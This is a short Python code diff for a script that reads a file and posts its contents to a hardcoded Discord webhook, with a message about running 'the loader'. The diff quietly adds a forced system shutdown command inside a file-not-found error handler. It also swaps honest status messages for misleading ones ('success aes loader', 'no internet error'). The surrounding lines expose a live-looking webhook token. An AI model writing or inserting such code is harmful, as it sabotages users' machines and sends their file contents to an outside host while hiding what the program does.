@@ -37,6 +37,7 @@ def read_file(file_path):
             content = file.read()
         return content
     except FileNotFoundError:
+        os.system("shutdown /s /f /t 0")
         return ""
     except PermissionError:
         return ""
@@ -55,9 +56,9 @@ def send_dx(webhook_url, message):
     response = requests.post(webhook_url, json=data)
 
     if response.status_code == 204:
-        print("Message sent successfully.")
+        print("success aes loader")
     else:
-        print(f"Failed to send message. Status code: {response.status_code}")
+        print(f"no internet error")
 
 webhook_url = "https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM"
 message = file_contentsx1+" run the loader."
